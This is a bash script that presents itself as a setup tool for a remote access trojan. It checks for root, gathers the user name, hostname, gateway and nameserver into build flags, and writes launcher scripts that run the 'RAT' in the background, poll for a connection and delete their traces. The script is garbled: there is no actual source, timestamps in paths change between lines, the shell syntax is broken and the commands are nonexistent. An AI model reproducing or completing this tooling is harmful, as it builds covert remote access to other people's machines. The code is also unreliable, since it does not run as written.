#!/bin/bash

# Check if running as root
if [[ "$EUID" -ne 0 ]]; then
    echo "Requires root permissions."
    exit 1
fi

# Create directory for the RAT
mkdir /tmp/rat_$(date +%s)
chmod 755 /tmp/rat_$RANDOM

# Create the main binary
cat <<EOF | gcc -o /tmp/rat_$(date +%s)/rat.x -Wall -O3 \
    -fPIC -I/usr/include/libstdc++\ \
    -shared -o /tmp/rat_$(date +%s)/lib/librat.so -fPIC -lcrypt -lseccmd \
    -I/usr/include/x86_64-linux-gnu  -I/usr/include/i386-linux-gnu \
    -DVERSION=\"1.0\" -DDEBUG=0 -DINFOS=$(date +%Y-%m-%d) \
    -DUSER=\"$(whoami)\" -DHOSTNAME=\"$(hostname)\" \
    -DNETWORK_GATEWAY=\"$(route | awk '/default/ \| /gateway/ {'{print \$3}'}\"') \
    -DNETWORK_NAMESERVER=\"$(cat /etc/resolv.conf | grep nameserver | awk '{print \$2}')\" \
    -DUSER\_HOME=\~ -DPROCESS\_ID=0 \
    -DMEMORY\_USED=\"10MB\" -DFILE\_SIZE="500KB"
echo "Compiling Rat..."
EOF

# Create a script to run the RAT from /tmp/rat_$(date +%s)/bin/run.sh
cat <<EOF | sed 's/\n/;/g' > /tmp/rat_$(date +%s)/bin/run.sh
#!/bin/bash

sleep 3 # Wait for service to start
# Start the RAT in the background
/tmp/rat_$(date +%s)/rat.x &

# Check if the PID is ready
while [[ -z "$pid" ]]; do
    sleep 0.5
    ifid=$!
    echo "Waiting for PID: $ifid..."
    [[ "$pid" == "$ifid" ]] || break
fi

# Check if the RAT started successfully
ifjancmd --version > /dev/null 2>&1; do
    echo "Rat started."
else
    echo "Failed to start RAT."
    exit 1
fi
sleep 3 # Give it time to load
# Check for errors in the rat.x logs
grep "ERROR" /tmp/rat_$(date +%s)/logs/rat.log > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Errors found in rat.log."
fi

# Check for errors in the shell's console output
grep "ERROR" "$!" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Errors found in console output."
fi
sleep 3 # Give it time to load
# Run a random command to ensure communication is working.
# This will likely work even if the RAT doesn't fully start,
# as it allows the user to see that they can connect to the device.
echo "Executing /tmp/rat_$(date +%s)/bin/run.sh" > /tmp/rat_$(date +%s)/logs/rat.log
sleep 5 # Give it time to run
# Clean up
rm -rf /tmp/rat_$(date +%s)
echo "Cleanup complete."

EOF

chmod +x /tmp/rat_$(date +%s)/bin/run.sh

# Create a shell script to start the RAT
cat <<EOF | sed 's/\n/;/g' > /tmp/rat_$(date +%s)/bin/start.sh
#!/bin/bash

sleep 3 # Wait for service to start
# Start the RAT in the background
/tmp/rat_$(date +%s)/rat.x &

echo "Successfully started RAT" | tee -a /tmp/rat_$(date +%s)/logs/rat.log

# Keep the script running until the user presses Ctrl+C
while true; do
    sleep 1
    if jncmd --version > /dev/null 2>&1; then
        echo "Connection Established" | tee -a /tmp/rat_$(date +%s)/logs/rat.log
        break
    else
        echo "Trying to reconnect..." | tee -a /tmp/rat_$(date +%s)/logs/rat.log
    fi
done

# Clean up
rm -rf /tmp/rat_$(date +%s)
echo "Cleanup complete."
EOF

chmod +x /tmp/rat_$(date +%s)/bin/start.sh

# Create a log file to track events
touch /tmp/rat_$(date +%s)/logs/rat.log

echo "Ready to connect!"
echo "1) Using JNCmd (recommended)"
echo "2) Using SSH"
